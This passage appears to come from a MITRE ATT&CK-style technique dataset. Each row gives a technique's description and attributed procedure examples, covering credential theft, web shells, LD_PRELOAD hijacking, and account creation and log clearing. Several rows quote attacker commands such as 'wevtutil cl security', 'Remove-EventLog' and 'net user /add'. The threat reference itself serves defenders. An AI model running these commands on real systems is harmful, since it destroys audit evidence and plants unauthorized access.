Explorer, Google Chrome, and Firefox.', '[SILENTTRINITY] can collect clear text web credentials for Internet Explorer/Edge.', '[NETWIRE] has the ability to steal credentials from web browsers including Internet Explorer, Opera, Yandex, and Chrome.', '[Melcoz] has the ability to steal credentials from web browsers.', '[LAPSUS$] has obtained passwords and session tokens with the use of the Redline password stealer.', '[BLUELIGHT] can collect passwords stored in web browers, including Internet Explorer, Edge, Chrome, and Naver Whale.', '[ChChes] steals credentials stored inside Internet Explorer.', '[Proton] gathers credentials for Google Chrome.', '[HEXANE] has used a [Mimikatz] tool and a PowerShell script to steal passwords from Google Chrome.', '[TA505] has used malware to gather credentials from Internet Explorer.', '[Molerats] used the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims.', '[Unknown Logger] is capable of stealing usernames and passwords from browsers on the victim machine.', '[Ajax Security Team] has used FireMalv custom-developed malware, which collected passwords from the Firefox browser storage.', '[Inception] used a browser plugin to steal passwords and sessions from Internet Explorer, Chrome, Opera, Firefox, Torch, and Yandex.', 'Some [Backdoor.Oldrea] samples contain a publicly available Web browser password recovery tool.', ""[Kimsuky] has used browser extensions including Google Chrome to steal passwords and cookies from browsers. [Kimsuky] has also used Nirsoft's WebBrowserPassView tool to dump the passwords obtained from victims."", '[Empire] can use modules that extract passwords from common web browsers such as Firefox and Chrome.', '[XAgentOSX] contains the getFirefoxPassword function to attempt to locate Firefox passwords.', '[Lizar] has a module to collect usernames and passwords stored in browsers.', '[PinchDuke] steals credentials from compromised hosts. [PinchDuke] credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by [PinchDuke] include ones associated with many sources such as Netscape Navigator, Mozilla Firefox, Mozilla Thunderbird, and Internet Explorer. ', '[OilRig] has used credential dumping tools such as [LaZagne] to steal credentials to accounts logged into the compromised system and to Outlook Web Access. [OilRig] has also used tool named PICKPOCKET to dump passwords from web browsers.', '[KeyBoy] attempts to collect passwords from browsers.', '[Grandoreiro] can steal cookie data and credentials from Google Chrome.', '[QakBot] has collected usernames and passwords from Firefox and Chrome.', '[Crimson] contains a module to steal credentials from Web browsers on the victim machine.', '[FIN6] has used the Stealer One credential stealer to target web browsers.', '[TrickBot] can obtain passwords stored in files from web browsers such as Chrome, Firefox, Internet Explorer, and Microsoft Edge, sometimes using [esentutl]', '[PLEAD] can harvest saved credentials from browsers such as Google Chrome, Microsoft Internet Explorer, and Mozilla Firefox.', '[PoetRAT] has used a Python tool named Browdec.exe to steal browser credentials.', '[Chaes] can steal login credentials and stored financial information from the browser.', '[Carberp] passw.plug plugin can gather passwords saved in Opera, Internet Explorer, Safari, Firefox, and Chrome.', '[Zebrocy] has the capability to upload dumper tools that extract credentials from web browsers and store them in database files.', '[Lokibot] has demonstrated the ability to steal credentials from multiple applications and data sources including Safari and the Chromium and Mozilla Firefox-based web browsers.', '[Stolen Pencil] has used tools that are capable of obtaining credentials from web browsers.', ""[APT29] has stolen user's saved passwords from Chrome."", '[Magic Hound] used FireMalv, custom-developed malware, which collected passwords from the Firefox browser storage.']",
T1574.008,Path Interception by Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.  Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Order Hijacking] the search order differs depending on the method that is used to execute the program.    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.  For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument <code>net user</code>. An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then <code>cmd.exe /C net user</code> will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT.   Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking]","['[Empire] contains modules that can discover and exploit search order hijacking vulnerabilities.', '[PowerSploit] contains a collection of Privesc-PowerUp modules that can discover and exploit search order hijacking vulnerabilities.']",
T1557.003,DHCP Spoofing,"Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing] or [Transmitted Data Manipulation]  DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients. The typical server-client interaction is as follows:   1. The client broadcasts a `DISCOVER` message.  2. The server responds with an `OFFER` message, which includes an available network address.   3. The client broadcasts a `REQUEST` message, which includes the network address offered.   4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.  Adversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers. Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.  DHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address. Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.  Rather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood] by generating many broadcast DISCOVER messages to exhaust a network’s DHCP allocation pool. ",[],False
T1027.001,Binary Padding,"Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.   Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed. ","['[TAINTEDSCRIBE] can execute <code>FileRecvWriteRand</code> to append random bytes to the end of a file received from C2.', '[Maze] has inserted large blocks of junk code, including some components to decrypt strings and other important information for later in the encryption process.', 'A version of [XTunnel] introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products.', '[FIN7] has used random junk code to obfuscate malware code.', '[Javali] can use large obfuscated libraries to hinder detection and analysis.', '[QakBot] can use large file sizes to evade detection.', '[Rifdoor] has added four additional bytes of data upon launching, then saved the changed version as <code>C:\\ProgramData\\Initech\\Initech.exe</code>.', '[Gamaredon Group] has obfuscated .NET executables by inserting junk code.\t', '[yty] contains junk code in its binary, likely to confuse malware analysts.', '[Leviathan] has inserted garbage characters into code, presumably to avoid anti-virus detection.', '[ZeroT] has obfuscated DLLs and functions using dummy API calls inserted between real instructions.', '[SamSam] has used garbage code to pad some of its malware components.', '[Grandoreiro] has added BMP images to the resources section of its Portable Executable (PE) file increasing each binary to at least 300MB in size.', '[APT29] used large size files to avoid detection by security solutions with hardcoded size limits.', '[Moafee] has been known to employ binary padding.', '[CostaBricks] has added the entire unobfuscated code of the legitimate open source application Blink to its code.', '[Bisonal] has appended random binary data to the end of itself to generate a large binary. ', '[Higaisa] performed padding with null bytes before calculating its hash.', '[WastedLocker] contains junk code to increase its entropy and hide the actual code.', 'Before writing to disk, [Kwampirs] inserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections.', '[CORESHELL] contains unused machine instructions in a likely attempt to hinder analysis.', '[FinFisher] contains junk code in its functions in an effort to confuse disassembly programs.', '[Black Basta] had added data prior to the Portable Executable (PE) header to prevent automatic scanners from identifying the payload.', '[Patchwork] apparently altered [NDiskMonitor] samples by adding four bytes of random letters in a likely attempt to change the file hashes.', '[Ember Bear] has added extra spaces between JavaScript code characters to increase the overall file size.', '[BRONZE BUTLER] downloader code has included ""0"" characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection.', 'A variant of [Emissary] appends junk data to the end of its DLL file to create a large file that may exceed the maximum size that anti-virus programs can scan.', '[APT32] includes garbage code to mislead anti-malware software and researchers.', '[Mustang Panda] has used junk code within their DLL files to hinder analysis.', '[Gelsemium] can use junk code to hide functions and evade detection.', '[Comnie] appends a total of 64MB of garbage data to a file to deter any security products in place that may be scanning files on disk.', '[POWERSTATS] has used useless code blocks to counter analysis.', '[FatDuke] has been packed with junk code and strings.', '[GrimAgent] has the ability to add bytes to change the file hash.', '[Snip3] can obfuscate strings using junk Chinese characters.', '[Goopy] has had null characters padded in its malicious DLL payload.']",
T1505.003,Web Shell,"Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.  In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper] Web shell client).","['[P.A.S. Webshell] can gain remote access and execution on target web servers.', '[OwaAuth] is a Web shell that appears to be exclusively used by [Threat Group-3390] It is installed as an ISAPI filter on Exchange servers and shares characteristics with the [China Chopper] Web shell.', ""[Dragonfly] has commonly created Web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files."", ""[APT28] has used a modified and obfuscated version of the reGeorg web shell to maintain persistence on a target's Outlook Web Access (OWA) server."", '[WIREFIRE] is a web shell that can download files to and execute arbitrary commands from compromised Ivanti Connect Secure VPNs.', '[OilRig] has used web shells, often to maintain access to a victim network.', '[FIN13] has utilized obfuscated and open-source web shells such as JspSpy, reGeorg, MiniWebCmdShell, and Vonloesch Jsp File Browser 1.2 to enable remote code execution and to execute commands on compromised web server.', ""[BackdoorDiplomacy] has used web shells to establish an initial foothold and for lateral movement within a victim's system."", '[BUSHWALK] is a web shell that has the ability to execute arbitrary commands or write files.', '[SLIGHTPULSE] is a web shell that can read, write, and execute files on compromised servers.', '[LIGHTWIRE] is a web shell capable of command execution and establishing persistence on compromised Ivanti Secure Connect VPNs.', '[Deep Panda] uses Web shells on publicly accessible Web servers to access victim networks.', 'During [C0017] [APT41] deployed JScript web shells through the creation of malicious ViewState objects.', 'During the [2022 Ukraine Electric Power Attack] [Sandworm Team] deployed the Neo-REGEORG\u202fwebshell on an internet-facing server.', 'During the [C0032] campaign, [TEMP.Veles] planted Web shells on Outlook Exchange servers.', '[APT39] has installed ANTAK and ASPXSPY web shells.', '[Volatile Cedar] can inject web shell code into a server. ', '[GALLIUM] used Web shells to persist in victim environments and assist in execution and exfiltration.', 'During [Cutting Edge] threat actors used multiple web shells to maintain presence on compromised Connect Secure appliances such as [WIREFIRE] [GLASSTOKEN] [BUSHWALK] [LIGHTWIRE] and [FRAMESTING]', '[STEADYPULSE] is a web shell that can enable the execution of arbitrary commands on compromised web servers.', '[Threat Group-3390] has used a variety of Web shells.', '[ASPXSpy] is a Web shell. The ASPXTool version used by [Threat Group-3390] has been deployed to accessible servers running Internet Information Services (IIS).', '[Tropic Trooper] has started a web service in the target host and wait for the adversary to connect, acting as a web shell.\t', '[HAFNIUM] has deployed multiple web shells on compromised servers including SIMPLESEESHARP, SPORTSBALL, [China Chopper] and [ASPXSpy]   ', '[PULSECHECK] is a web shell that can enable command execution on compromised servers.', '[Moses Staff] has dropped a web shell onto a compromised system.', '[Sandworm Team] has used webshells including [P.A.S. Webshell] to maintain access to victim networks.', '[FRAMESTING] is a web shell capable of enabling arbitrary command execution on compromised Ivanti Connect Secure VPNs.', '[RAPIDPULSE] is a web shell that is capable of arbitrary file read on targeted web servers to exfiltrate items of interest on the victim device.', '[Fox Kitten] has installed web shells on compromised hosts to maintain access.', '[Tonto Team] has used a first stage web shell after compromising a vulnerable Exchange server.', '[Volt Typhoon] has used webshells, including ones named AuditReport.jspx and iisstart.aspx, in compromised environments.', '[APT38] has used web shells for persistence or to ensure redundant access.', '[APT29] has installed web shells on exploited Microsoft Exchange servers.', 'During [Operation CuckooBees] the threat actors generated a web shell within a vulnerable Enterprise Resource Planning Web Application Server as a persistence mechanism.', '[SUPERNOVA] is a Web shell.', '[Magic Hound] has used multiple web shells to gain execution.', '[SEASHARPEE] is a Web shell.', '[China Chopper] server component is a Web Shell payload.', '[GLASSTOKEN] is a web shell capable of tunneling C2 connections and code execution on compromised Ivanti Secure Connect VPNs. ', '[APT5] has installed multiple web shells on compromised servers including on Pulse Secure VPN appliances.', '[APT32] has used Web shells to maintain access to victim websites.', ""[Leviathan] relies on web shells for an initial foothold as well as persistence into the victim's systems."", 'During [Operation Wocao] threat actors used their own web shells, as well as those previously placed on target systems by other threat actors, for reconnaissance and lateral movement.', '[Kimsuky] has used modified versions of open source PHP web shells to maintain access, often adding ""Dinosaur"" references within the code.', '[TEMP.Veles] has planted Web shells on Outlook Exchange servers.', '[Operation Wocao] has used their own web shells, as well as those previously placed on target systems by other threat actors, for reconnaissance and lateral movement.', ""[Dragonfly 2.0] commonly created Web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files.""]",False
T1484.001,Group Policy Modification,"Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.   Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.  Malicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job] [Disable or Modify Tools] [Ingress Tool Transfer] [Create Account] [Service Execution]  and more. Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.  For example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job] by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml</code>. In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.","['[Prestige] has been deployed using the Default Domain Group Policy Object from an Active Directory Domain Controller.', ""[HermeticWiper] has the ability to deploy through an infected system's default domain policy."", '[Cinnamon Tempest] has used Group Policy to deploy batch scripts for ransomware deployment.', '[Empire] can use <code>New-GPOImmediateTask</code> to modify a GPO that will install and execute a malicious [Scheduled Task/Job]', '[Indrik Spider] has used Group Policy Objects to deploy batch scripts.', '[Egregor] can modify the GPO to evade detection. ', '[Meteor] can use group policy to push a scheduled task from the AD to all network machines.', 'During the [2022 Ukraine Electric Power Attack] [Sandworm Team] leveraged Group Policy Objects (GPOs) to deploy and execute malware.']",False
T1552.004,Private Keys,"Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc.   Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.  When a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device’s identity. An adversary with access to the device may be able to export the keys in order to impersonate the device.  On network devices, private keys may be exported via [Network Device CLI] commands such as `crypto pki export`.   Some private keys require a password or passphrase for operation, so an adversary may also use [Input Capture] for keylogging or attempt to [Brute Force] the passphrase off-line. These private keys can be used to authenticate to [Remote Services] like SSH or for use in decrypting other collected files such as email.","['[Machete] has scanned and looked for cryptographic keys and certificate file extensions. ', '[Mimikatz] <code>CRYPTO::Extract</code> module can extract keys by interacting with Windows cryptographic application programming interface (API) functions.', 'During [Operation Wocao] threat actors used [Mimikatz] to dump certificates and private keys from the Windows certificate store.', '[Kinsing] has searched for private keys.', '[Hildegard] has searched for private keys in .ssh.', '[Mafalda] can collect a Chrome encryption key used to protect browser cookies.', '[Scattered Spider] enumerate and exfiltrate code-signing certificates from a compromised host.', 'During the [SolarWinds Compromise] [APT29] obtained PKI keys, certificate files, and the private encryption key from an Active Directory Federation Services (AD FS) container to decrypt corresponding SAML signing certificates.', '[FoggyWeb] can retrieve token signing certificates and token decryption certificates from a compromised AD FS server.', '[TeamTNT] has searched for unsecured SSH keys.', '[Empire] can use modules like <code>Invoke-SessionGopher</code> to extract private key and session information.', '[AADInternals] can gather encryption keys from Azure AD services such as ADSync and Active Directory Federated Services servers.', '[Rocke] has used SSH private keys on the infected machine to spread its coinminer throughout a network.', '[Ebury] has intercepted unencrypted private keys as well as private key pass-phrases.\t', '[jRAT] can steal keys for VPNs and cryptocurrency wallets.', '[UNC2452] obtained the private encryption key from an Active Directory Federation Services (AD FS) container to decrypt corresponding SAML signing certificates.', '[APT29] obtained PKI keys, certificate files and the private encryption key from an Active Directory Federation Services (AD FS) container to decrypt corresponding SAML signing certificates.', '[Operation Wocao] has used Mimikatz to dump certificates and private keys from the Windows certificate store.']",False
T1583.004,Server,"Adversaries may buy, lease, rent, or obtain physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in [Drive-by Compromise] enabling [Phishing] operations, or facilitating [Command and Control] Instead of compromising a third-party [Server] or renting a [Virtual Private Server] adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused.   Adversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.","['During [Operation Dream Job] [Lazarus Group] acquired servers to host their malicious tools.', '[GALLIUM] has used Taiwan-based servers that appear to be exclusive to [GALLIUM]', '[Kimsuky] has purchased hosting servers with virtual currency and prepaid cards.', 'For [Operation Wocao] the threat actors purchased servers with Bitcoin to use during the operation.', '[Sandworm Team] has leased servers from resellers instead of leasing infrastructure directly from hosting companies to enable its operations.', 'During [Night Dragon] threat actors purchased hosted services to use for C2.', 'For [Operation Honeybee] at least one identified persona was used to register for a free account for a control server. ', '[Earth Lusca] has acquired multiple servers for some of their operations, using each server for a different role.', '[Mustard Tempest] has acquired servers to host second-stage payloads that remain active for a period of either days, weeks, or months.', '[Lazarus Group] has acquired servers to host their malicious tools.', '[Gelsemium] has established infrastructure through renting servers at multiple providers worldwide.']",False
T1021.006,Windows Remote Management,"Adversaries may use [Valid Accounts] to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.  WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the `winrm` command or by any number of programs such as PowerShell. WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation]","['[FIN13] has leveraged `WMI` to move laterally within a compromised network via application servers and SQL servers.', '[Brute Ratel C4] can use WinRM for pivoting.', '[Chimera] has used WinRM for lateral movement.', 'During the [SolarWinds Compromise] [APT29] used WinRM via PowerShell to execute commands and payloads on remote hosts.', '[Cobalt Strike] can use <code>WinRM</code> to execute a payload on a remote host.', '[SILENTTRINITY] tracks `TrustedHosts` and can move laterally to these targets via WinRM.', '[Threat Group-3390] has used WinRM to enable remote execution.', '[Wizard Spider] has used Window Remote Management to move laterally through a victim network.', '[APT29] has used WinRM via PowerShell to execute command and payloads on remote hosts.', '[UNC2452] has used WinRM via PowerShell to execute command and payloads on remote hosts.', '[Cobalt Strike] can use <code>WinRM</code> to execute a payload on a remote host.']",False
T1011.001,Exfiltration Over Bluetooth,"Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.  Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.","['[Flame] has a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways, including transmitting encoded information from the infected system over the Bluetooth protocol, acting as a Bluetooth beacon, and identifying other Bluetooth devices in the vicinity.']",
T1078.001,Default Accounts,"Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.  Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys] or credential materials to legitimately connect to remote environments via [Remote Services]","['[FIN13] has leveraged default credentials for authenticating myWebMethods (WMS) and QLogic web management interface to gain initial access.', '[HyperStack] can use default credentials to connect to IPC$ shares on remote machines.', '[Magic Hound] enabled and used the default system managed account, DefaultAccount, via `""powershell.exe"" /c net user DefaultAccount /active:yes` to connect to a targeted Exchange server over RDP.', '[Stuxnet] infected WinCC machines via a hardcoded database server password.']",False
T1547.003,Time Providers,"Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.  Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\`. The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.  Adversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.",[],False
T1546.005,Trap,"Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.  Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where ""command list"" will be executed when ""signals"" are received.",[],
T1574.006,Dynamic Linker Hijacking,"Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.  On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage [Dynamic Linker Hijacking] to export variables in a shell or set variables programmatically using higher level syntax such Python’s <code>os.environ</code>.  On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file. Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.    On macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program. ","['[Rocke] has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.\t', '[Hildegard] has modified /etc/ld.so.preload to intercept shared library import functions.', '[HiddenWasp] adds itself as a shared object to the LD_PRELOAD environment variable.', '[XCSSET] adds malicious file paths to the <code>DYLD_FRAMEWORK_PATH</code> and <code>DYLD_LIBRARY_PATH</code> environment variables to execute malicious code.', '[APT41] has configured payloads to load via LD_PRELOAD.\t', '[COATHANGER] copies the malicious file <code>/data2/.bd.key/preload.so</code> to <code>/lib/preload.so</code>, then launches a child process that executes the malicious file <code>/data2/.bd.key/authd</code> as <code>/bin/authd</code> with the arguments <code>/lib/preload.so reboot newreboot 1</code>. This injects the malicious preload.so file into the process with PID 1, and replaces its reboot function with the malicious newreboot function for persistence.', '[Ebury] has injected its dynamic library into descendent processes of sshd via LD_PRELOAD.']",
T1136.001,Local Account,"Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.   For example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common [Network Device CLI] commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.  Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.","['[Wizard Spider] has created local administrator accounts to maintain persistence in compromised networks.', '[APT5] has created Local Administrator accounts to maintain access to systems with short-cycle credential rotation.', '[HiddenWasp] creates a user account as a means to provide initial persistence to the compromised machine.', '[GoldenSpy] can create new users on an infected system.\t', '[Empire] has a module for creating a local user if permissions allow.', '[Dragonfly] has created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.', '[TeamTNT] has created local privileged users on victim machines.', '[Fox Kitten] has created a local user account with administrator privileges.', '[SMOKEDHAM] has created user accounts.', '[APT41] has created user accounts. ', '[FIN13] has created MS-SQL local accounts in a compromised network.', '[Flame] can create backdoor accounts with login “HelpAssistant” on domain connected systems if appropriate rights are available.', '[ServHelper] has created a new user named ""supportaccount"".', '[Kimsuky] has created accounts with <code>net user</code>.', '[Pupy] can user PowerView to execute “net user” commands and create local system accounts.', '[S-Type] may create a temporary user on the system named `Lost_{Unique Identifier}` with the password `pond~!@6”{Unique Identifier}`.', 'The <code>net user username \\password</code> commands in [Net] can be used to create a local account.', '[DarkGate] creates a local user account, <code>SafeMode</code>, via <code>net user</code> commands.', '[Mis-Type] may create a temporary user on the system named `Lost_{Unique Identifier}`.', '[Magic Hound] has created local accounts named `help` and `DefaultAccount` on compromised machines.', '[Carbanak] can create a Windows account.', '[Leafminer] used a tool called Imecab to set up a persistent remote access account on the victim machine.', '[APT39] has created accounts on multiple compromised hosts to perform actions within the network.', '[Hildegard] has created a user named “monerodaemon”.', '[ZxShell] has a feature to create local user accounts.', '[APT3] has been known to create or enable accounts, such as <code>support_388945a0</code>.', ""[Calisto] has the capability to add its own account to the victim's machine."", '[Dragonfly 2.0] created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.']",False
T1070.001,Clear Windows Event Logs,"Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.   With administrator privileges, the event logs can be cleared with the following utility commands:  * <code>wevtutil cl system</code> * <code>wevtutil cl application</code> * <code>wevtutil cl security</code>  These logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell] For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.  Adversaries may also attempt to clear logs by directly deleting the stored log files within `C:\Windows\System32\winevt\logs\`.","['[Meteor] can use [Wevtutil] to remove Security, System and Application Event Viewer logs.', '[FIN8] has cleared logs during post compromise cleanup activities.', '[SynAck] clears event logs.', '[NotPetya] uses <code>wevtutil</code> to clear the Windows event logs.', '[Mafalda] can delete Windows Event logs by invoking the `OpenEventLogW` and `ClearEventLogW` functions.', '[Wevtutil] can be used to clear system and security event logs from the system.', '[Chimera] has cleared event logs on compromised hosts.', '[APT28] has cleared event logs, including by using the commands <code>wevtutil cl System</code> and <code>wevtutil cl Security</code>.', '[APT41] attempted to remove evidence of some of its activity by clearing Windows security and system events.', '[Lucifer] can clear and remove event logs.', '[Olympic Destroyer] will attempt to clear the System and Security event logs using <code>wevtutil</code>.', '[Indrik Spider] has used [Cobalt Strike] to empty log files.', '[APT38] clears Window Event logs and Sysmon logs from the system.', '[Dragonfly] has cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. The actors also deleted specific Registry keys.', '[FinFisher] clears the system event logs using <code> OpenEventLog/ClearEventLog APIs </code>.', '[BlackCat] can clear Windows event logs using `wevtutil.exe`.', '[ZxShell] has a command to clear system event logs. ', '[HermeticWizard] has the ability to use `wevtutil cl system` to clear event logs.', '[APT32] has cleared select event log entries.', '[KillDisk] deletes Application, Security, Setup, and System Windows Event Logs.', '[FIN5] has cleared event logs from victims.', '[gh0st RAT] is able to wipe event logs.', '[Hydraq] creates a backdoor through which remote attackers can clear all system event logs.', '[Pupy] has a module to clear event logs with PowerShell.', '[RunningRAT] contains code to clear event logs.', 'The [BlackEnergy] component KillDisk is capable of deleting Windows Event Logs.', 'During [Operation Wocao] the threat actors deleted all Windows system and security event logs using `/Q /c wevtutil cl system` and `/Q /c wevtutil cl security`.', '[HermeticWiper] can overwrite the `C:\\Windows\\System32\\winevt\\Logs` file on a targeted system.', '[Operation Wocao] has deleted Windows Event 